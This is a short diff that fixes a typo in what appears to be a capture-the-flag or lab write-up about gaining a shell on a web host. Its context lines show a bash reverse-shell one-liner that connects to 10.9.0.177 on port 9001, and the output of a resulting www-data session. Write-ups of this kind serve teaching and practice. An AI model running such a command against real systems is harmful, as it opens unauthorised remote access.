@@ -22,7 +22,7 @@ on the browser. The code here, obtained after I spawned a shell
 And so am tempted to try a reverse shell command here.
 bash -c 'bash -i >& /dev/tcp/10.9.0.177/9001 0>&1'
 
-and boom we I have spawned a session as www-data
+and boom I have spawned a session as www-data.
 
 www-data@injection:/var/www/html$ whoami
 whoami
